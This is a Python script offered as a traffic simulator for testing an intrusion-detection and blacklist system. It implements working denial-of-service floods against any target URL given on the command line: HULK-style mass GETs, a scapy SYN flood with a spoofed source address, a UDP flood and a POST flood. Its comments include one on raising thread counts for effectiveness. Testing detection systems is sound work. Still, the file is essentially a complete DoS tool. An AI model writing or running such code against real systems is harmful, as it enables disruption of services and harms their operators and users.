"""
client.py

This script simulates different types of network traffic — both benign and malicious —
to test the behavior and resilience of the detection and blacklist system.

Supported attack types:
- benign: Single request per second (baseline traffic)
- hulk: Mass concurrent HTTP GET requests
- synflood: TCP SYN flood (requires root)
- udpflood: UDP packet flood
- postflood: Mass concurrent HTTP POST requests
"""

import requests
import threading
import time
import random
import string
import socket
from scapy.all import IP, TCP, send
import socket



def benign_attack(target_url, duration):
    """Sends regular HTTP requests at a fixed rate (1 per second)."""
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            r = requests.get(target_url)
            print(f"[BENIGN] Status: {r.status_code}")
        except Exception as e:
            print(f"[BENIGN] Error: {e}")
        time.sleep(1)  # Delay to simulate typical browsing behavior

def hulk_attack(target_url, duration):
    """Simulates a Hulk attack by sending massive concurrent GET requests with random query strings."""
    def send_request():
        # Generate a random 8-character string to create a unique URL on each request
        rand_str = ''.join(random.choices(string.ascii_letters, k=8))
        try:
            r = requests.get(f"{target_url}/?{rand_str}")
            print(f"[HULK] Status: {r.status_code}")
        except Exception as e:
            print(f"[HULK] Error: {e}")

    # Run the attack for the specified duration
    end_time = time.time() + duration
    while time.time() < end_time:
        threads = []
        
        # Launch 500 concurrent requests in this cycle, can be altered for improved effectiveness
        for _ in range(500):
            t = threading.Thread(target=send_request)
            t.start()
            threads.append(t)

        # Wait for all threads to finish before continuing
        for t in threads:
            t.join()

def synflood_attack(target_url, duration):
    """
    Simulates a TCP SYN flood attack using raw packets (requires root privileges).
    Sends spoofed SYN packets to exhaust server resources.
    """
    host = target_url.split("//")[1].split(":")[0]
    end_time = time.time() + duration

    def send_syn():
        count = 0
        src_ip = "192.168.1.100"  # Spoofed source IP to avoid self-blacklisting
        while time.time() < end_time:
            # Construct raw IP and TCP SYN packet
            ip = IP(src=src_ip, dst=host)
            tcp = TCP(sport=random.randint(1024,65535), dport=8080, flags="S", seq=random.randint(1000,9000))
            packet = ip / tcp
            send(packet, verbose=0)
            count += 1
            if count % 100 == 0:
                print(f"Thread {threading.get_ident()}: Sent {count} SYN packets")

    print(f"Starting SYN flood attack on {host} for {duration} seconds with 100 threads")

    # Launch 100 parallel threads to simulate distributed source
    threads = []
    for _ in range(100):
        t = threading.Thread(target=send_syn)
        t.daemon = True
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print("SYN flood attack finished")


def udpflood_attack(target_url, duration):
    """Sends large volumes of random UDP packets to the target port."""
    def send_packet():
        host = target_url.split("//")[1].split(":")[0]
        port = 8080 # Default target port, in real attacks this value is randomized
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        msg = random._urandom(1024) # Random 1KB payload
        try:
            sock.sendto(msg, (host, port))
            print(f"[UDP-FLOOD] Sent to {host}:{port}")
        except Exception as e:
            print(f"[UDP-FLOOD] Error: {e}")
        finally:
            sock.close()

    end_time = time.time() + duration
    while time.time() < end_time:
        threads = []
        for _ in range(100):
            t = threading.Thread(target=send_packet)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()

def postflood_attack(target_url, duration):
    """Simulates a flood of POST requests with random payloads."""
    def send_post():
        try:
            payload = {"data": random._urandom(512).hex()} # 512 bytes of random data in hex
            r = requests.post(target_url, data=payload)
            print(f"[POST-FLOOD] Status: {r.status_code}")
        except Exception as e:
            print(f"[POST-FLOOD] Error: {e}")

    end_time = time.time() + duration
    while time.time() < end_time:
        threads = []
        for _ in range(100):
            t = threading.Thread(target=send_post)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()

def run_attack(attack_type, target_url, duration):
    """Dispatches the requested attack type."""
    if attack_type == "benign":
        benign_attack(target_url, duration)
    elif attack_type == "hulk":
        hulk_attack(target_url, duration)
    elif attack_type == "synflood":
        synflood_attack(target_url, duration)
    elif attack_type == "udpflood":
        udpflood_attack(target_url, duration)
    elif attack_type == "postflood":
        postflood_attack(target_url, duration)
    else:
        print(f"Ataque {attack_type} no implementado. Opciones válidas: benign, hulk, goldeneye, slowhttptest, heartbleed, synflood, udpflood, postflood.")

if __name__ == "__main__":
    # CLI interface to configure the attack
    import argparse

    parser = argparse.ArgumentParser(description="Modular client to simulate various DoS attack types.")
    parser.add_argument("--type", required=True, help="Attack type: benign, hulk, synflood, udpflood, postflood")
    parser.add_argument("--url", required=True, help="Target URL, e.g., http://192.168.1.140:8080")
    parser.add_argument("--duration", type=int, default=60, help="Duration of the attack in seconds")

    args = parser.parse_args()
    run_attack(args.type.lower(), args.url, args.duration)
